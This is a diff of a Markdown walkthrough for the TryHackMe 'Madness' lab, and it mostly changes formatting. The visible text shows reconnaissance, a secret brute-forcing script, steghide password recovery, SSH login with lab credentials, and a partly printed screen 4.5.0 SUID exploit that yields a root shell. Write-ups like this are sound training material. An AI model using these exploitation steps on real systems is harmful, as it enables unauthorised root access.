@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Free
 Description: Will you be consumed by Madness?
 ```
+
 Room link: [https://tryhackme.com/r/room/madness](https://tryhackme.com/r/room/madness)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/madness](https://tryhackme.com/r/room/m
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ nmap -v -sV -sC 10.10.143.14
@@ -77,7 +81,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds
 ```
+
 We have two services running:
+
 - OpenSSH 7.2p2 on port 22
 - Apache httpd 2.4.18 on port 80
 
@@ -86,6 +92,7 @@ We have two services running:
 Manually browsing to port 80 shows an `Apache2 Ubuntu Default Page`.
 
 Looking more closely at the HTML-source we can find an interesting comment near a `thm.jpg` file
+
 ```html
       <div class="page_header floating_element">
         <img src="thm.jpg" class="floating_element"/>
@@ -96,10 +103,13 @@ Looking more closely at the HTML-source we can find an interesting comment near 
 ```
 
 Trying to browse to the image only shows an error
-```
+
+```text
 The image "http://10.10.143.14/thm.jpg" cannot be displayed because it contains errors.
 ```
+
 so we download it with `wget` instead
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ wget http://10.10.143.14/thm.jpg                                               
@@ -114,7 +124,8 @@ thm.jpg                                        100%[============================
 2024-09-28 17:59:29 (547 KB/s) - ‘thm.jpg’ saved [22210/22210]
 ```
 
-Checking the file with `xxd` shows a PNG header!?  
+Checking the file with `xxd` shows a PNG header!?
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ xxd -l 48 thm.jpg        
@@ -122,11 +133,13 @@ Checking the file with `xxd` shows a PNG header!?
 00000010: 0001 0000 ffdb 0043 0003 0202 0302 0203  .......C........
 00000020: 0303 0304 0303 0405 0805 0504 0405 0a07  ................
 ```
+
 What's going on? Is the header corrupted with a PNG header?
 
 Checking [this list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) we can see that the first 12 bytes should be `FF D8 FF E0 00 10 4A 46 49 46 00 01` in hexadecimal instead.
 
 Let's fix it with `echo` and `dd`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ cp thm.jpg thm_fixed.jpg
@@ -146,21 +159,26 @@ Ah, there is a hidden directory called `/th1s_1s_h1dd3n`.
 
 ### Check the hidden directory
 
-Browsing to the hidden directory (http://10.10.143.14/th1s_1s_h1dd3n/) shows a greeting
-```
+Browsing to the hidden directory (`http://10.10.143.14/th1s_1s_h1dd3n/`) shows a greeting
+
+```text
 Welcome! I have been expecting you!
 
 To obtain my identity you need to guess my secret! 
 ```
+
 Checking the HTML-source further shows a useful comment
-```
+
+```text
 <!-- It's between 0-99 but I don't think anyone will look here-->
 ```
+
 We ought to be able to brute-force the value of `secret`
 
 ### Brute-force the secret value
 
 Let's write a small Python script with the [requests module](https://pypi.org/project/requests/) that brute-forces the value
+
 ```python
 #!/usr/bin/python3
 
@@ -179,6 +197,7 @@ session.close()
 ```
 
 Then we run the script
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ chmod +x bf_secret.py   
@@ -205,9 +224,11 @@ Correct secret is: 73
 </body>
 </html>
 ```
+
 The text `y2RPJ4QaPF!B` very much looks like a password!  
 
 We can check if it is a password for `steghide`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ steghide extract -sf thm_fixed.jpg -p 'y2RPJ4QaPF!B'
@@ -223,19 +244,23 @@ wbxre
 
 I didn't say I would make it easy for you!
 ```
+
 Hhm, the username looks really strange. What if it is encoded?  
 The room hint says `There's something ROTten about this guys name!`  
 So let's try to decode it with ROT13
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ echo wbxre | rot13 
 joker
 ```
+
 That's makes more sense.
 
 ### Try to login with SSH as joker
 
 Now that we have user credentials (`joker:y2RPJ4QaPF!B`) we ought to be able to login with SSH
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ ssh joker@10.10.143.14
@@ -245,6 +270,7 @@ joker@10.10.143.14's password:
 Permission denied, please try again.
 joker@10.10.143.14's password: 
 ```
+
 But no, that didn't work!
 
 Here I got stuck for quite a while until I found a hint to use the image from the room (the file named `5iW7kC8.jpg`).
@@ -252,7 +278,8 @@ Here I got stuck for quite a while until I found a hint to use the image from th
 ### Another steghide hidden file
 
 Let's try `steghide` another time
-```bash          
+
+```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ steghide extract -sf 5iW7kC8.jpg                  
 Enter passphrase: 
@@ -270,6 +297,7 @@ Here take my password
 ### Try to login with SSH again
 
 Now we try to login again with updated credentials (`joker:*axA&GF8dP`)
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ ssh joker@10.10.143.14                            
@@ -291,11 +319,13 @@ applicable law.
 Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
 joker@ubuntu:~$ 
 ```
+
 And we are in!
 
 ### Get the user flag
 
 Next, we can search for the user flag
+
 ```bash
 joker@ubuntu:~$ ls -la
 total 20
@@ -315,14 +345,17 @@ joker@ubuntu:~$
 It's now time for enumeration and finding a way to escalate our privileges.  
 
 First we check if we can run commands as `root` with `sudo`
+
 ```bash
 joker@ubuntu:~$ sudo -l
 [sudo] password for joker: 
 Sorry, user joker may not run sudo on ubuntu.
 ```
+
 But no. No such luck!
 
 Next, we check for SUID binaries with `find`
+
 ```bash
 joker@ubuntu:~$ find / -type f -perm /4000 2> /dev/null
 /usr/lib/openssh/ssh-keysign
@@ -344,9 +377,11 @@ joker@ubuntu:~$ find / -type f -perm /4000 2> /dev/null
 /bin/ping
 /bin/umount
 ```
+
 What sticks out here are the two lines of `screen`.
 
 We check for available exploits for that version
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ searchsploit screen 4.5.0
@@ -370,6 +405,7 @@ Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Madness/41154.sh
 ```
 
 Let's check the exploit more closely
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
 └─$ cat 41154.sh                                     
@@ -416,11 +452,13 @@ echo "[+] Triggering..."
 screen -ls # screen itself is setuid, so...
 /tmp/rootshell 
 ```
+
 It looks promising!
 
 ### Privilege escalation
 
 Now we try it in our logged in session
+
 ```bash
 joker@ubuntu:~$ cd /tmp
 joker@ubuntu:/tmp$ vi exploit.sh
@@ -458,11 +496,13 @@ No Sockets found in /tmp/screens/S-joker.
 uid=0(root) gid=0(root) groups=0(root),1000(joker)
 # 
 ```
+
 Excellent, we are root!
 
 ### Get the root flag
 
 And finally, we get the root flag
+
 ```bash
 # cd /root
 # ls
